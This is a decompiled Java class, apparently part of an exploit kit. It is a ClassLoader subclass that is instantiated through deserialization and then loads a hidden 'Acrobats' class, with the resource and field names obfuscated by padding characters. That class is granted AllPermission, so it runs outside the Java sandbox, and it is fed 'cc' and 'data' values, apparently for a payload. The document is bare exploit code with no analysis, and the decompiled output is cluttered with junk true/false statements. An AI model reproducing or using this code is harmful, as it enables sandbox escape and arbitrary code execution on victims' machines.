// 
// Decompiled by Procyon v0.5.30
// 

package yahoo;

import java.security.Permission;
import java.security.AllPermission;
import java.security.PermissionCollection;
import java.security.ProtectionDomain;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.cert.Certificate;
import java.net.URL;
import java.lang.reflect.Field;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class Cloners extends ClassLoader implements Serializable
{
    public static Cloners instance;
    private static final long serialVersionUID = 6812622870313961944L;
    
    private void writeObject(final ObjectOutputStream objectOutputStream) throws IOException, ClassNotFoundException {
        true;
        false;
        true;
        objectOutputStream.defaultWriteObject();
    }
    
    private void readObject(final ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException {
        Cloners.instance = this;
        objectInputStream.defaultReadObject();
        false;
    }
    
    public void __I(final String s, final String s2) throws IOException {
        false;
        true;
        final int n = 8192;
        true;
        true;
        true;
        true;
        false;
        try {
            true;
            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            final byte[] array = new byte[n];
            false;
            final String replace = "ya666hoo66".replace("6", "").replace(".AA".replace("A", ""), "/".replace("E", ""));
            true;
            final InputStream resourceAsStream = this.getClass().getResourceAsStream("/".replace("6", "") + replace + "/A====c===r===ob====at==s======.====c=l====a=ss".replace("=", ""));
            true;
            false;
            true;
            int read;
            while ((read = resourceAsStream.read(array)) > 0) {
                true;
                false;
                byteArrayOutputStream.write(array, 0, read);
                false;
            }
            false;
            true;
            final Class minitClass = this.minitClass(byteArrayOutputStream.toByteArray());
            if (minitClass != null) {
                final Field field = minitClass.getField("``cc".replace("`", ""));
                false;
                final Field field2 = minitClass.getField("dCCCaCCCta".replace("C", ""));
                false;
                final Object instance = minitClass.newInstance();
                false;
                false;
                field.set(instance, s2);
                true;
                field2.set(instance, s);
                minitClass.newInstance();
                false;
            }
            false;
        }
        catch (Exception ex) {
            false;
        }
        true;
    }
    
    public Class minitClass(final byte[] array) throws IOException {
        true;
        final int n = 0;
        false;
        true;
        false;
        final String replace = "file33333:33333//333/".replace("3", "");
        false;
        false;
        final URL url = new URL(replace);
        final Certificate[] array2 = new Certificate[n];
        false;
        false;
        final Permissions permissions = new Permissions();
        false;
        this.AddPerm(permissions);
        final CodeSource codeSource = new CodeSource(url, array2);
        true;
        final ProtectionDomain protectionDomain = new ProtectionDomain(codeSource, permissions);
        false;
        return this.defineClass("yahoo.Acrobats", array, n, array.length, protectionDomain);
    }
    
    public void AddPerm(final Permissions permissions) {
        permissions.add(new AllPermission());
    }
    
    static {
        Cloners.instance = null;
    }
}
